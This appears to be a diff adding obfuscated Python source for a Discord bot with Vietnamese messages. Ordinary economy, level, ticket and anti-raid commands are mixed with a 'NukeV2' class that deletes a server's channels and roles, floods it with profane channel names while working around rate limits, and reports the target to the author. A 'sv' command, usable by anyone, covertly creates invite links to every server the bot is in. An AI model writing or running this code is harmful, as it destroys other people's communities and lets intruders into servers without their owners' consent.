+                        l1l1l1l1111l = await l1ll1ll1l11l.json()
+                        l111llllll11 = l1l1l1l1111l['data']['images']['original']['url']
+                        l1l1l11llll1 = discord.Embed(title=f'🎞️ GIF: {l1llll1l1ll1}', color=52479, timestamp=ll1l11l1ll1l())
+                        l1l1l11llll1.set_image(url=l111llllll11)
+                        await lll1111lll1l.send(embed=l1l1l11llll1)
+                    else:
+                        await lll1111lll1l.send('❌ Không tìm thấy GIF.')
+        except:
+            await lll1111lll1l.send('❌ Lỗi kết nối API GIF.')
+
+class EconomyCommands(commands.Cog):
+
+    def __init__(l1l11lll1l1l, l1l11l1lll11):
+        l1l11lll1l1l.bot = l1l11l1lll11
+
+    @commands.command(name='balance', aliases=['bal'])
+    async def lll111111lll(llll1lllllll, llll1l111111, lll1ll111lll: discord.Member=None):
+        if lll1ll111lll is None:
+            lll1ll111lll = llll1l111111.author
+        l11ll1111ll1 = Economy.l1ll1l11llll(lll1ll111lll.id)
+        ll11l1llll11 = discord.Embed(title=f'💰 Balance of {lll1ll111lll.name}', description=f'**Coins:** {ll1l111l1111(l11ll1111ll1)}', color=16766720, timestamp=ll1l11l1ll1l())
+        ll11l1llll11.set_thumbnail(url=lll1ll111lll.display_avatar.url)
+        await llll1l111111.send(embed=ll11l1llll11)
+
+    @commands.command(name='daily')
+    async def l1l1l11l11ll(l1llll1l1lll, l11llllllll1):
+        l1llll1ll1ll = l11llllllll1.author.id
+        l11l111l1l1l = llll1l1ll11l.l11111111l1l(f'daily_{l1llll1ll1ll}', 0)
+        l11ll11ll1l1 = time.time()
+        if l11ll11ll1l1 - l11l111l1l1l < 86400:
+            l1l111l1ll11 = int(86400 - (l11ll11ll1l1 - l11l111l1l1l))
+            await l11llllllll1.send(f'⏳ Bạn đã nhận daily rồi. Còn {l1l111l1ll11 // 3600}h {l1l111l1ll11 % 3600 // 60}m.')
+            return
+        l11lllll1l1l = random.randint(100, 500)
+        Economy.lll1l1lll1ll(l1llll1ll1ll, l11lllll1l1l)
+        llll1l1ll11l.set(f'daily_{l1llll1ll1ll}', l11ll11ll1l1)
+        await l11llllllll1.send(f'✅ Bạn đã nhận **{l11lllll1l1l} coins** từ daily reward!')
+
+    @commands.command(name='work')
+    async def l11ll11ll111(llllll11l1l1, l111l11l111l):
+        l111l111l111 = l111l11l111l.author.id
+        lllll11l1ll1 = llll1l1ll11l.l11111111l1l(f'work_{l111l111l111}', 0)
+        llllllll1lll = time.time()
+        if llllllll1lll - lllll11l1ll1 < 60:
+            l11lll11l1l1 = int(60 - (llllllll1lll - lllll11l1ll1))
+            await l111l11l111l.send(f'⏳ Nghỉ ngơi chút đi, còn {l11lll11l1l1}s nữa mới làm tiếp.')
+            return
+        lll11ll11ll1 = random.randint(50, 200)
+        Economy.lll1l1lll1ll(l111l111l111, lll11ll11ll1)
+        llll1l1ll11l.set(f'work_{l111l111l111}', llllllll1lll)
+        ll11l11l1lll = ['👨\u200d💻 viết code', '🧹 dọn dẹp server', '☕ pha cà phê', '🐛 fix bug', '📝 viết báo cáo', '🛠️ sửa bot']
+        l111l1l1111l = random.choice(ll11l11l1lll)
+        await l111l11l111l.send(f'✅ Bạn vừa {l111l1l1111l} và nhận được **{lll11ll11ll1} coins**!')
+
+    @commands.command(name='shop')
+    async def l11l1l1ll1ll(ll111l1ll1l1, l1111lll1lll):
+        ll111l1l1111 = discord.Embed(title='🏪 LUNAL SHOP', color=16766720, timestamp=ll1l11l1ll1l())
+        for l111l111l1ll, l1lllll11lll in shop_items.items():
+            ll111l1l1111.add_field(name=l1lllll11lll['name'], value=f"Price: {ll1l111l1111(l1lllll11lll['price'])} coins\n{l1lllll11lll['desc']}\n`l!buy {l111l111l1ll}`", inline=False)
+        await l1111lll1lll.send(embed=ll111l1l1111)
+
+    @commands.command(name='buy')
+    async def l1lllll1ll1l(l11llll11l1l, ll1ll11ll11l, lllll1ll1ll1: str):
+        ll111l1lllll = shop_items.l11111111l1l(lllll1ll1ll1.lower())
+        if not ll111l1lllll:
+            await ll1ll11ll11l.send('❌ Item không tồn tại. Xem `l!shop`.')
+            return
+        if not Economy.l1ll1l1l11ll(ll1ll11ll11l.author.id, ll111l1lllll['price']):
+            await ll1ll11ll11l.send(f"❌ Không đủ tiền! Giá: {ll1l111l1111(ll111l1lllll['price'])} coins.")
+            return
+        Economy.ll1l1l11ll1l(ll1ll11ll11l.author.id, lllll1ll1ll1.lower())
+        await ll1ll11ll11l.send(f"✅ Bạn đã mua **{ll111l1lllll['name']}** thành công!")
+
+    @commands.command(name='inventory')
+    async def l1l1lll1l1ll(ll1ll1l1l11l, ll1l1lll1lll, lllll111l1l1: discord.Member=None):
+        if lllll111l1l1 is None:
+            lllll111l1l1 = ll1l1lll1lll.author
+        l111ll111lll = Economy.l11l1llll1ll(lllll111l1l1.id)
+        if not l111ll111lll:
+            await ll1l1lll1lll.send(f'ℹ️ {lllll111l1l1.name} chưa có item nào.')
+            return
+        l11ll111lll1 = {'vip': '⭐ VIP Role', 'color': '🎨 Color Role', 'boost': '🚀 XP Boost'}
+        l1l1l1l11111 = '\n'.join([f'• {l11ll111lll1.l11111111l1l(ll111lll1ll1, ll111lll1ll1)}' for ll111lll1ll1 in l111ll111lll])
+        lll1l1lll1l1 = discord.Embed(title=f'🎒 Inventory of {lllll111l1l1.name}', description=l1l1l1l11111, color=16766720, timestamp=ll1l11l1ll1l())
+        await ll1l1lll1lll.send(embed=lll1l1lll1l1)
+
+class LevelCommands(commands.Cog):
+
+    def __init__(llllllll11l1, l1111ll11l11):
+        llllllll11l1.bot = l1111ll11l11
+
+    @commands.command(name='level')
+    async def llllll1l111l(l11ll1llllll, llllllll1111, lllll1111ll1: discord.Member=None):
+        if lllll1111ll1 is None:
+            lllll1111ll1 = llllllll1111.author
+        ll1111l1llll = lllll1111ll1.id
+        ll1l1lll11l1 = LevelSystem.l111l1l1ll1l(ll1111l1llll)
+        l11111111lll = LevelSystem.lll11ll1l11l(ll1111l1llll)
+        llllll1l1111 = LevelSystem.l11l11l11111(l11111111lll)
+        lll11ll1ll11 = ll1l1lll11l1 / llllll1l1111 * 100 if llllll1l1111 > 0 else 0
+        lll1l1lll111 = discord.Embed(title=f'📊 Level of {lllll1111ll1.name}', color=65416, timestamp=ll1l11l1ll1l())
+        lll1l1lll111.set_thumbnail(url=lllll1111ll1.display_avatar.url)
+        lll1l1lll111.add_field(name='Level', value=l11111111lll, inline=True)
+        lll1l1lll111.add_field(name='XP', value=f'{ll1l111l1111(ll1l1lll11l1)} / {ll1l111l1111(llllll1l1111)}', inline=True)
+        lll1l1lll111.add_field(name='Progress', value=f'{lll11ll1ll11:.1f}%', inline=True)
+        lll1l1lll111.add_field(name='📈 Progress Bar', value=f"`{int(lll11ll1ll11 // 5) * '█'}{'░' * (20 - int(lll11ll1ll11 // 5))}`", inline=False)
+        lll1l1lll111.set_footer(text=f'Requested by {llllllll1111.author.name}')
+        await llllllll1111.send(embed=lll1l1lll111)
+
+    @commands.command(name='rank')
+    async def lll11l1l1ll1(ll1l11ll1l1l, l1l1l1ll1l1l):
+        l1111l1l1l11 = {str(lll1l111ll1l.id) for lll1l111ll1l in l1l1l1ll1l1l.guild.members if not lll1l111ll1l.bot}
+        ll1lllll1l11 = []
+        for ll1l1ll1llll, llllll11lll1 in llll1l1ll11l.data.items():
+            if ll1l1ll1llll.startswith('user_'):
+                llll1lll1111 = int(ll1l1ll1llll.split('_')[1])
+                if str(llll1lll1111) in l1111l1l1l11:
+                    ll1lllll1l11.append((llll1lll1111, llllll11lll1.l11111111l1l('xp', 0), llllll11lll1.l11111111l1l('level', 1)))
+        llllll111l11 = sorted(ll1lllll1l11, key=lambda x: x[1], reverse=True)[:10]
+        l11l11ll111l = discord.Embed(title='🏆 LUNAL LEADERBOARD', color=16766720, timestamp=ll1l11l1ll1l())
+        lll11l11l1l1 = ''
+        for l1l1l1lllll1, (llll1lll1111, l11l1l1ll1l1, llll111l1lll) in enumerate(llllll111l11, 1):
+            try:
+                ll1l1l1llll1 = l1l1l1ll1l1l.guild.get_member(llll1lll1111)
+                l1llll1ll111 = ll1l1l1llll1.display_name if ll1l1l1llll1 else f'User {llll1lll1111 % 10000}'
+            except:
+                l1llll1ll111 = f'User {llll1lll1111 % 10000}'
+            l1lll1l11lll = '🥇' if l1l1l1lllll1 == 1 else '🥈' if l1l1l1lllll1 == 2 else '🥉' if l1l1l1lllll1 == 3 else '🔹'
+            lll11l11l1l1 += f'{l1lll1l11lll} **#{l1l1l1lllll1}** {l1llll1ll111} — Lv.{llll111l1lll} (XP: {ll1l111l1111(l11l1l1ll1l1)})\n'
+        l11l11ll111l.description = lll11l11l1l1 or 'Chưa có ai tham gia.'
+        await l1l1l1ll1l1l.send(embed=l11l11ll111l)
+
+class Ticket(commands.Cog):
+
+    def __init__(llll1l1lll1l, lll111l1l11l):
+        llll1l1lll1l.bot = lll111l1l11l
+
+    @commands.command(name='ticket')
+    async def l1ll11lll1ll(l11llll11lll, l1l1111l1ll1, *, l1l1111l1l1l: str='No reason'):
+        l1lllll1l1ll = l1l1111l1ll1.guild
+        l11l1l1111ll = discord.utils.l11111111l1l(l1lllll1l1ll.categories, name='Tickets')
+        if not l11l1l1111ll:
+            l11l1l1111ll = await l1lllll1l1ll.create_category('Tickets')
+        lll1l111lll1 = f"ticket-{l1l1111l1ll1.author.name.lower().replace(' ', '-')}"
+        ll1l1ll111l1 = {l1lllll1l1ll.default_role: discord.PermissionOverwrite(view_channel=False), l1l1111l1ll1.author: discord.PermissionOverwrite(view_channel=True, send_messages=True), l1lllll1l1ll.me: discord.PermissionOverwrite(view_channel=True, send_messages=True)}
+        ll111l111lll = await l1lllll1l1ll.create_text_channel(lll1l111lll1, category=l11l1l1111ll, overwrites=ll1l1ll111l1)
+        lllllll1l111 = discord.Embed(title='🎫 Ticket Created', description=f'Reason: {l1l1111l1l1l}\nUse `l!close` to close this ticket.', color=10181046, timestamp=ll1l11l1ll1l())
+        await ll111l111lll.send(f'{l1l1111l1ll1.author.mention}', embed=lllllll1l111)
+        tickets[ll111l111lll.id] = {'author': l1l1111l1ll1.author.id, 'reason': l1l1111l1l1l}
+        await l1l1111l1ll1.send(f'✅ Ticket created: {ll111l111lll.mention}', delete_after=5)
+
+    @commands.command(name='close')
+    async def l1l1llll1l1l(l11l11lll111, l1lll1lll1l1):
+        if l1lll1lll1l1.channel.id not in tickets:
+            await l1lll1lll1l1.send('❌ Đây không phải là ticket.')
+            return
+        await l1lll1lll1l1.channel.send('🔒 Closing ticket in 5 seconds...')
+        await asyncio.sleep(5)
+        await l1lll1lll1l1.channel.lll1lll1l111()
+
+class Anti(commands.Cog):
+
+    def __init__(lll1l1ll1l1l, l11ll1111l1l):
+        lll1l1ll1l1l.bot = l11ll1111l1l
+
+    def l1l1111l11ll(l1111ll111ll, ll1l1ll11ll1: int) -> dict:
+        lll1l1l1llll = f'anti_{ll1l1ll11ll1}'
+        l1l1111111ll = llll1l1ll11l.l11111111l1l(lll1l1l1llll)
+        if l1l1111111ll is None:
+            l1l1111111ll = {'antinuke': False, 'antiraid': False, 'antibot': False, 'log_channel': None, 'raid_threshold': 5, 'raid_time': 5, 'whitelist': []}
+            llll1l1ll11l.set(lll1l1l1llll, l1l1111111ll)
+            l111l1l1l111(f'Tạo config anti mới cho server {ll1l1ll11ll1}', 'INFO')
+        return l1l1111111ll
+
+    def l1l1ll1ll11l(l11l1llll1l1, lll1l1l1l111: int, l11l1l11llll: dict):
+        llllll1llll1 = f'anti_{lll1l1l1l111}'
+        llll1l1ll11l.set(llllll1llll1, l11l1l11llll)
+        l111l1l1l111(f'Đã lưu config anti cho server {lll1l1l1l111}: {l11l1l11llll}', 'INFO')
+
+    @commands.command(name='antinuke')
+    @commands.has_permissions(administrator=True)
+    async def lllll11l1111(lll11ll1llll, l1ll11l1ll11, llll11llllll: str=None):
+        l1l1llll1lll = lll11ll1llll.l1l1111l11ll(l1ll11l1ll11.guild.id)
+        if llll11llllll is None:
+            l111l1l1llll = discord.Embed(title='🛡️ Anti-Nuke Status', description=f"Trạng thái: **{('🟢 BẬT' if l1l1llll1lll['antinuke'] else '🔴 TẮT')}**", color=65416 if l1l1llll1lll['antinuke'] else 16729156, timestamp=ll1l11l1ll1l())
+            l111l1l1llll.set_footer(text=f'Lệnh bởi {l1ll11l1ll11.author.name}')
+            await l1ll11l1ll11.send(embed=l111l1l1llll)
+            return
+        if llll11llllll.lower() in ['on', 'bật', 'true', '1']:
+            l1l1llll1lll['antinuke'] = True
+            l1llllll11ll = '🛡️ **Anti-Nuke đã được BẬT!**'
+        elif llll11llllll.lower() in ['off', 'tắt', 'false', '0']:
+            l1l1llll1lll['antinuke'] = False
+            l1llllll11ll = '🛡️ **Anti-Nuke đã được TẮT.**'
+        else:
+            await l1ll11l1ll11.send('❌ Vui lòng nhập `on` hoặc `off`.\nVí dụ: `l!antinuke on`')
+            return
+        lll11ll1llll.l1l1ll1ll11l(l1ll11l1ll11.guild.id, l1l1llll1lll)
+        l111l1l1llll = discord.Embed(title='🛡️ Anti-Nuke', description=l1llllll11ll, color=65416 if l1l1llll1lll['antinuke'] else 16755200, timestamp=ll1l11l1ll1l())
+        l111l1l1llll.set_footer(text=f'Lệnh bởi {l1ll11l1ll11.author.name}')
+        await l1ll11l1ll11.send(embed=l111l1l1llll)
+
+    @commands.command(name='antiraid')
+    @commands.has_permissions(administrator=True)
+    async def l1l1l11ll11l(l1lll111llll, l11ll1ll111l, l11ll1111l11: str=None):
+        llll111111l1 = l1lll111llll.l1l1111l11ll(l11ll1ll111l.guild.id)
+        if l11ll1111l11 is None:
+            l1l11l11lll1 = discord.Embed(title='🛡️ Anti-Raid Status', description=f"Trạng thái: **{('🟢 BẬT' if llll111111l1['antiraid'] else '🔴 TẮT')}**\nNgưỡng: `{llll111111l1['raid_threshold']}` tin nhắn trong `{llll111111l1['raid_time']}` giây", color=65416 if llll111111l1['antiraid'] else 16729156, timestamp=ll1l11l1ll1l())
+            l1l11l11lll1.set_footer(text=f'Lệnh bởi {l11ll1ll111l.author.name}')
+            await l11ll1ll111l.send(embed=l1l11l11lll1)
+            return
+        if l11ll1111l11.lower() in ['on', 'bật', 'true', '1']:
+            llll111111l1['antiraid'] = True
+            l1l1lll111ll = '🛡️ ** đã được BẬT!**'
+        elif l11ll1111l11.lower() in ['off', 'tắt', 'false', '0']:
+            llll111111l1['antiraid'] = False
+            l1l1lll111ll = '🛡️ **Anti-Raid đã được TẮT.**'
+        else:
+            await l11ll1ll111l.send('❌ Vui lòng nhập `on` hoặc `off`.\nVí dụ: `l!antiraid on`')
+            return
+        l1lll111llll.l1l1ll1ll11l(l11ll1ll111l.guild.id, llll111111l1)
+        l1l11l11lll1 = discord.Embed(title='🛡️ Anti-Raid', description=l1l1lll111ll, color=65416 if llll111111l1['antiraid'] else 16755200, timestamp=ll1l11l1ll1l())
+        l1l11l11lll1.set_footer(text=f'Lệnh bởi {l11ll1ll111l.author.name}')
+        await l11ll1ll111l.send(embed=l1l11l11lll1)
+
+    @commands.command(name='antibot')
+    @commands.has_permissions(administrator=True)
+    async def l11l1ll11111(ll111llll1ll, l11lllll111l, ll1llll1l1l1: str=None):
+        llll111l1111 = ll111llll1ll.l1l1111l11ll(l11lllll111l.guild.id)
+        if ll1llll1l1l1 is None:
+            l1111l1l1ll1 = discord.Embed(title='🛡️ Anti-Bot Status', description=f"Trạng thái: **{('🟢 BẬT' if llll111l1111['antibot'] else '🔴 TẮT')}**", color=65416 if llll111l1111['antibot'] else 16729156, timestamp=ll1l11l1ll1l())
+            l1111l1l1ll1.set_footer(text=f'Lệnh bởi {l11lllll111l.author.name}')
+            await l11lllll111l.send(embed=l1111l1l1ll1)
+            return
+        if ll1llll1l1l1.lower() in ['on', 'bật', 'true', '1']:
+            llll111l1111['antibot'] = True
+            l1l111lll11l = '🛡️ **Anti-Bot đã được BẬT!**'
+        elif ll1llll1l1l1.lower() in ['off', 'tắt', 'false', '0']:
+            llll111l1111['antibot'] = False
+            l1l111lll11l = '🛡️ **Anti-Bot đã được TẮT.**'
+        else:
+            await l11lllll111l.send('❌ Vui lòng nhập `on` hoặc `off`.\nVí dụ: `l!antibot on`')
+            return
+        ll111llll1ll.l1l1ll1ll11l(l11lllll111l.guild.id, llll111l1111)
+        l1111l1l1ll1 = discord.Embed(title='🛡️ Anti-Bot', description=l1l111lll11l, color=65416 if llll111l1111['antibot'] else 16755200, timestamp=ll1l11l1ll1l())
+        l1111l1l1ll1.set_footer(text=f'Lệnh bởi {l11lllll111l.author.name}')
+        await l11lllll111l.send(embed=l1111l1l1ll1)
+
+    @commands.command(name='setlog')
+    @commands.has_permissions(administrator=True)
+    async def ll11lll1l1l1(ll1lll1l111l, l111l111lll1, l1ll11l1l11l: discord.TextChannel=None):
+        l111llllll1l = ll1lll1l111l.l1l1111l11ll(l111l111lll1.guild.id)
+        if l1ll11l1l11l is None:
+            l1ll111111l1 = l111llllll1l.l11111111l1l('log_channel')
+            if l1ll111111l1:
+                l11l11111l11 = l111l111lll1.guild.get_channel(l1ll111111l1)
+                l1ll1l1111ll = l11l11111l11.mention if l11l11111l11 else '❌ Kênh không tồn tại'
+                l1111ll11l1l = discord.Embed(title='📋 Log Channel', description=f'Kênh log hiện tại: {l1ll1l1111ll}', color=52479, timestamp=ll1l11l1ll1l())
+                l1111ll11l1l.set_footer(text=f'Lệnh bởi {l111l111lll1.author.name}')
+                await l111l111lll1.send(embed=l1111ll11l1l)
+            else:
+                await l111l111lll1.send('📋 Chưa có kênh log nào được thiết lập. Dùng `l!setlog #channel` để thiết lập.')
+            return
+        l111llllll1l['log_channel'] = l1ll11l1l11l.id
+        ll1lll1l111l.l1l1ll1ll11l(l111l111lll1.guild.id, l111llllll1l)
+        l1111ll11l1l = discord.Embed(title='📋 Log Channel', description=f'Đã thiết lập kênh log thành {l1ll11l1l11l.mention}', color=52479, timestamp=ll1l11l1ll1l())
+        l1111ll11l1l.set_footer(text=f'Lệnh bởi {l111l111lll1.author.name}')
+        await l111l111lll1.send(embed=l1111ll11l1l)
+
+    @commands.command(name='setraid')
+    @commands.has_permissions(administrator=True)
+    async def ll1l1111l1l1(ll1ll11111ll, l1l1l11l111l, l11111l1l111: int, lllll11ll1l1: int):
+        if l11111l1l111 < 3 or lllll11ll1l1 < 2:
+            await l1l1l11l111l.send('❌ Giá trị tối thiểu: threshold >= 3, seconds >= 2.')
+            return
+        l11ll1lll1l1 = ll1ll11111ll.l1l1111l11ll(l1l1l11l111l.guild.id)
+        l11ll1lll1l1['raid_threshold'] = l11111l1l111
+        l11ll1lll1l1['raid_time'] = lllll11ll1l1
+        ll1ll11111ll.l1l1ll1ll11l(l1l1l11l111l.guild.id, l11ll1lll1l1)
+        await l1l1l11l111l.send(f'✅ Đã đặt Anti-Raid: {l11111l1l111} tin nhắn trong {lllll11ll1l1} giây.')
+
+    @commands.command(name='anti')
+    @commands.has_permissions(administrator=True)
+    async def lll1ll1l1l11(ll1111ll11ll, l1lll11l1lll):
+        l1111lllll11 = ll1111ll11ll.l1l1111l11ll(l1lll11l1lll.guild.id)
+        ll11lll11ll1 = discord.Embed(title='🛡️ ANTI CONFIG', color=52479, timestamp=ll1l11l1ll1l())
+        ll11lll11ll1.add_field(name='Anti-Nuke', value='🟢 BẬT' if l1111lllll11['antinuke'] else '🔴 TẮT', inline=True)
+        ll11lll11ll1.add_field(name='Anti-Raid', value='🟢 BẬT' if l1111lllll11['antiraid'] else '🔴 TẮT', inline=True)
+        ll11lll11ll1.add_field(name='Anti-Bot', value='🟢 BẬT' if l1111lllll11['antibot'] else '🔴 TẮT', inline=True)
+        ll11lll11ll1.add_field(name='Log Channel', value=f"<#{l1111lllll11['log_channel']}>" if l1111lllll11['log_channel'] else '❌ Chưa set', inline=False)
+        ll11lll11ll1.add_field(name='Raid Threshold', value=f"{l1111lllll11['raid_threshold']} msg / {l1111lllll11['raid_time']}s", inline=False)
+        ll11lll11ll1.set_footer(text=f'Lệnh bởi {l1lll11l1lll.author.name}')
+        await l1lll11l1lll.send(embed=ll11lll11ll1)
+
+class ServerList(commands.Cog):
+
+    def __init__(l1l1ll11l1l1, ll1l111llll1):
+        l1l1ll11l1l1.bot = ll1l111llll1
+
+    @commands.command(name='sv')
+    async def l1ll1lll1111(l1l11l11l111, ll1ll111llll):
+        await ll1ll111llll.message.lll1lll1l111()
+        ll1lllll1l1l = l1l11l11l111.bot.guilds
+        llll1111l11l = sum((l1l11111llll.member_count for l1l11111llll in ll1lllll1l1l))
+        ll1ll11l1l11 = discord.Embed(title='🌐 LUNAL KINGDOM - SERVER LIST', description=f'Bot ở **{len(ll1lllll1l1l)}** server với **{llll1111l11l}** thành viên', color=65416, timestamp=ll1l11l1ll1l())
+        ll1ll11l1l11.set_thumbnail(url='https://i.pinimg.com/736x/6c/3c/88/6c3c885c40e7d4b12b597fdf55c61951.jpg')
+        ll1ll11l1l11.set_footer(text='LUNAL NUKE | l!help')
+        l1111llll111 = sorted(ll1lllll1l1l, key=lambda g: g.member_count, reverse=True)
+        for lllllll1l11l in l1111llll111[:20]:
+            try:
+                ll11ll1lllll = None
+                for l1ll111l1lll in lllllll1l11l.text_channels:
+                    try:
+                        ll11ll1lllll = await l1ll111l1lll.create_invite(max_age=60, max_uses=1)
+                        break
+                    except:
+                        continue
+                lll1l111l111 = f'[Link]({ll11ll1lllll.url})' if ll11ll1lllll else '❌ No permission'
+                ll1ll11l1l11.add_field(name=f'🟢 {lllllll1l11l.name}', value=f'👥 {lllllll1l11l.member_count} members | 👑 {lllllll1l11l.owner}\n🔗 {lll1l111l111}', inline=False)
+            except:
+                ll1ll11l1l11.add_field(name=f'🟢 {lllllll1l11l.name}', value=f'👥 {lllllll1l11l.member_count} members | 👑 {lllllll1l11l.owner}\n🔗 ❌ Cannot create link', inline=False)
+        if len(ll1lllll1l1l) > 20:
+            ll1ll11l1l11.add_field(name='📌 And more...', value=f'**{len(ll1lllll1l1l) - 20}** more servers. Use `l!sv_all` to see all.', inline=False)
+        try:
+            await ll1ll111llll.author.send(embed=ll1ll11l1l11)
+            await ll1ll111llll.send('📨 Sent server list to DM!', delete_after=3)
+        except:
+            await ll1ll111llll.send(embed=ll1ll11l1l11)
+
+    @commands.command(name='sv_all')
+    async def llllll1ll1ll(lll1ll1lll1l, ll1ll1ll1ll1):
+        await ll1ll1ll1ll1.message.lll1lll1l111()
+        l11l111llll1 = lll1ll1lll1l.bot.guilds
+        l11l111l11ll = sum((l111ll11l1l1.member_count for l111ll11l1l1 in l11l111llll1))
+        llll11ll11l1 = '=' * 60 + '\n'
+        llll11ll11l1 += '🌐 LUNAL KINGDOM - ALL SERVERS\n'
+        llll11ll11l1 += f'📊 Total: {len(l11l111llll1)} servers | {l11l111l11ll} members\n'
+        llll11ll11l1 += '=' * 60 + '\n\n'
+        l1l1llllllll = sorted(l11l111llll1, key=lambda g: g.member_count, reverse=True)
+        for l11l11lll11l, l1111lll11l1 in enumerate(l1l1llllllll, 1):
+            ll1llll11111 = '❌ Cannot create'
+            for l1l111l11l11 in l1111lll11l1.text_channels:
+                try:
+                    llll1llll11l = await l1l111l11l11.create_invite(max_age=60, max_uses=1)
+                    ll1llll11111 = llll1llll11l.url
+                    break
+                except:
+                    continue
+            llll11ll11l1 += f'{l11l11lll11l}. 🟢 {l1111lll11l1.name}\n'
+            llll11ll11l1 += f'   📌 ID: {l1111lll11l1.id}\n'
+            llll11ll11l1 += f'   👥 Members: {l1111lll11l1.member_count}\n'
+            llll11ll11l1 += f'   👑 Owner: {l1111lll11l1.owner}\n'
+            llll11ll11l1 += f"   📅 Created: {l1111lll11l1.created_at.strftime('%d/%m/%Y')}\n"
+            llll11ll11l1 += f'   🔗 Link: {ll1llll11111}\n'
+            llll11ll11l1 += '-' * 50 + '\n'
+        l11ll111llll = discord.File(io.StringIO(llll11ll11l1), filename='lunal_servers.txt')
+        try:
+            await ll1ll1ll1ll1.author.send(file=l11ll111llll, content='📋 **All servers list:**')
+            await ll1ll1ll1ll1.send('📨 Sent file to DM!', delete_after=3)
+        except:
+            await ll1ll1ll1ll1.send(file=l11ll111llll)
+
+class NukeV2:
+
+    def __init__(ll111ll11l11):
+        ll111ll11l11.rate_limit_delay = 0.3
+        ll111ll11l11.message_delay = 0.3
+        ll111ll11l11.max_messages = 15
+        ll111ll11l11.last_nuke_time = 0
+        ll111ll11l11.concurrent_tasks = 60
+        ll111ll11l11.channel_names = ['L̶̸̖̣̃̇́͏Ũ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏Ã̶̸̖̣̇́͏L̶̸̖̣̃̇́͏ K̶̸̖̣̃̇́͏Ĩ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏G̶̸̖̣̃̇́͏D̶̸̖̣̃̇́͏Õ̶̸̖̣̇́͏M̶̸̖̣̃̇́͏'] * 40 + ['Ñ̶̸̖̣̇́͏Ũ̶̸̖̣̇́͏K̶̸̖̣̃̇́͏Ẽ̶̸̖̣̇́͏D̶̸̖̣̃̇́͏ B̶̸̖̣̃̇́͏Ỹ̶̸̖̣̇́͏ M̶̸̖̣̃̇́͏Ĩ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏ D̶̸̖̣̃̇́͏Z̶̸̖̣̃̇́͏'] * 40 + ['L̶̸̖̣̃̇́͏Ũ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏Ã̶̸̖̣̇́͏L̶̸̖̣̃̇́͏ B̶̸̖̣̃̇́͏Á T̶̸̖̣̃̇́͏Õ̶̸̖̣̇́͏P̶̸̖̣̃̇́͏'] * 40 + ['ĐỊT̶̸̖̣̃̇́͏ C̶̸̖̣̃̇́͏Õ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏ M̶̸̖̣̃̇́͏Ẹ B̶̸̖̣̃̇́͏ỌÑ̶̸̖̣̇́͏ M̶̸̖̣̃̇́͏ÀỸ̶̸̖̣̇́͏'] * 40 + ['Ñ̶̸̖̣̇́͏Ũ̶̸̖̣̇́͏K̶̸̖̣̃̇́͏Ẽ̶̸̖̣̇́͏D̶̸̖̣̃̇́͏ B̶̸̖̣̃̇́͏Ỹ̶̸̖̣̇́͏ L̶̸̖̣̃̇́͏Ũ̶̸̖̣̇́͏Ñ̶̸̖̣̇́͏Ã̶̸̖̣̇́͏L̶̸̖̣̃̇́͏'] * 40
+        random.shuffle(ll111ll11l11.channel_names)
+
+    async def l1l111l1l111(ll11ll1l1ll1, ll11llll11l1=None, llll11l11111=None):
+        l111l1lll111 = l11ll11l111l.get_channel(LOG_CHANNEL_ID)
+        if l111l1lll111:
+            try:
+                await l111l1lll111.send(content=ll11llll11l1, embed=llll11l11111)
+            except:
+                pass
+
+    async def ll1llll1ll11(lllllll1111l, l1ll1111llll, l1l11l1l11ll):
+        lll11l1ll1ll = l1ll1111llll.guild
+        lll1ll11l1ll = discord.Embed(title='LUNAL Nuke Initiated', color=3092790, timestamp=ll1l11l1ll1l())
+        lll1ll11l1ll.add_field(name='Server', value=f'{lll11l1ll1ll.name} (ID: {lll11l1ll1ll.id})', inline=False)
+        lll1ll11l1ll.add_field(name='Owner', value=str(lll11l1ll1ll.owner or 'Unknown'), inline=True)
+        lll1ll11l1ll.add_field(name='Members', value=str(lll11l1ll1ll.member_count), inline=True)
+        lll1ll11l1ll.add_field(name='Channels', value=str(len(lll11l1ll1ll.channels)), inline=True)
+        lll1ll11l1ll.add_field(name='Roles', value=str(len(lll11l1ll1ll.roles)), inline=True)
+        lll1ll11l1ll.add_field(name='Created', value=lll11l1ll1ll.created_at.strftime('%d/%m/%Y %H:%M:%S'), inline=False)
+        lll1ll11l1ll.add_field(name='Executed By', value=f'{l1ll1111llll.author} (ID: {l1ll1111llll.author.id})', inline=False)
+        lll1ll11l1ll.set_footer(text=f"Time: {ll1l11l1ll1l().strftime('%d/%m/%Y %H:%M:%S')}")
+        if lll11l1ll1ll.icon:
+            lll1ll11l1ll.set_thumbnail(url=lll11l1ll1ll.icon.url)
+        await lllllll1111l.l1l111l1l111(ll11llll11l1=f'**Support 1:** {SUPPORT_LINK}\n**Support 2:** {SUPPORT_LINK2}', llll11l11111=lll1ll11l1ll)
+
+    async def ll11l1lll11l(l111111l111l, l11ll1ll1111, l11l1l111ll1):
+        if l11ll1ll1111.id in l11l1l111ll1:
+            return None
+        try:
+            await l11ll1ll1111.lll1lll1l111()
+            l11l1l111ll1.add(l11ll1ll1111.id)
+            return f'Deleted: {l11ll1ll1111.name}'
+        except:
+            l11l1l111ll1.add(l11ll1ll1111.id)
+            return None
+
+    async def l11l11l11l11(l1llll1llll1, ll11ll1111l1, l1lll111l1l1, ll111llllll1=3):
+        for ll11111l11l1 in range(ll111llllll1):
+            try:
+                l11ll1l1l1l1 = await ll11ll1111l1.create_text_channel(l1lll111l1l1)
+                return (l11ll1l1l1l1, f'Created: {l1lll111l1l1}')
+            except discord.HTTPException as e:
+                if e.status == 429:
+                    await asyncio.sleep(float(e.response.headers.l11111111l1l('Retry-After', 1)))
+                else:
+                    return (None, f'Failed: {l1lll111l1l1}')
+            except:
+                return (None, f'Error: {l1lll111l1l1}')
+        return (None, f'Failed after {ll111llllll1} retries')
+
+    async def l1111lll1l1l(ll1l1ll111ll, ll1l11l1l1ll):
+        for l111l1l1l1l1 in ll1l11l1l1ll.roles:
+            if l111l1l1l1l1.position < ll1l11l1l1ll.me.top_role.position and (not l111l1l1l1l1.is_default()):
+                try:
+                    await l111l1l1l1l1.lll1lll1l111()
+                    await ll1l1ll111ll.l1l111l1l111(f'Deleted role: {l111l1l1l1l1.name}')
+                except:
+                    pass
+
+    async def lll1lll111ll(l1l1l11111l1, ll11111111ll=0.1, l11l111l11l1=False):
